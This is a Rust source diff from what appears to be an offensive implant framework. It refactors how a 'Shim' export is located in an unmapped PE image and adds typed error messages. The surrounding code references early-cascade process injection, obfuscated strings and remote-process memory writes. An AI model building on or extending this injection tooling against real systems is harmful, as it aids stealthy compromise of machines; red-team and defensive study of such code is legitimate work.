@@ -1,12 +1,11 @@
 use std::{
     ffi::c_void,
-    iter::once,
     ptr::{null_mut, read_unaligned},
 };
 
 use shared::tasks::WyrmResult;
 use shared_no_std::{
-    export_resolver::find_export_from_unmapped_file,
+    export_resolver::{ExportError, calculate_memory_delta, find_export_from_unmapped_file},
     memory::{EarlyCascadePointers, locate_shim_pointers},
 };
 use str_crypter::{decrypt_string, sc};
@@ -227,47 +226,32 @@ fn find_shim_export_address(
     buf: &Vec<u8>,
     base_original_allocation: *const u8,
 ) -> Result<*const c_void, String> {
-    if buf.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
-        let msg = format!(
-            "{} {}",
-            sc!("Buffer too small! Sz:", 201).unwrap(),
-            buf.len()
-        );
-        print_failed(&msg);
-
-        return Err(msg);
-    }
-
-    let dos = unsafe { read_unaligned(buf.as_ptr() as *const IMAGE_DOS_HEADER) };
-    let nt_ptr = unsafe { buf.as_ptr().add(dos.e_lfanew as usize) } as *const u8;
-
-    match find_export_from_unmapped_file(buf.as_ptr() as _, nt_ptr as _, "Shim") {
-        Some(p) => {
+    match find_export_from_unmapped_file(&buf, "Shim") {
+        Ok(p) => {
             let addr = calculate_memory_delta(buf.as_ptr() as usize, p as usize)
                 .ok_or(sc!("Could not calculate memory delta.", 204).unwrap())?;
             let addr_calculated = unsafe { base_original_allocation.add(addr) };
             Ok(addr_calculated as _)
         }
-        None => {
-            let msg = sc!(
-                "Could not find the Shim address in the PE image to spawn",
-                164
-            )
-            .unwrap();
+        Err(e) => {
+            let part = match e {
+                ExportError::ImageTooSmall => sc!("Image too small", 65).unwrap(),
+                ExportError::ImageUnaligned => sc!("Image not aligned", 65).unwrap(),
+                ExportError::ExportNotFound => sc!("Export not found", 65).unwrap(),
+            };
+
+            let msg = format!(
+                "{} {part}",
+                sc!(
+                    "Could not find the Shim address in the PE image to spawn.",
+                    164
+                )
+                .unwrap()
+            );
             print_failed(&msg);
             return Err(msg);
         }
     }
-}
-
-fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> Option<usize> {
-    let res = fn_ptr_address.saturating_sub(buf_start_address);
-
-    if res == 0 {
-        return None;
-    }
-
-    Some(res)
 }
 
 /// Allocates and writes memory pages in a remote process with `PAGE_READWRITE` protection
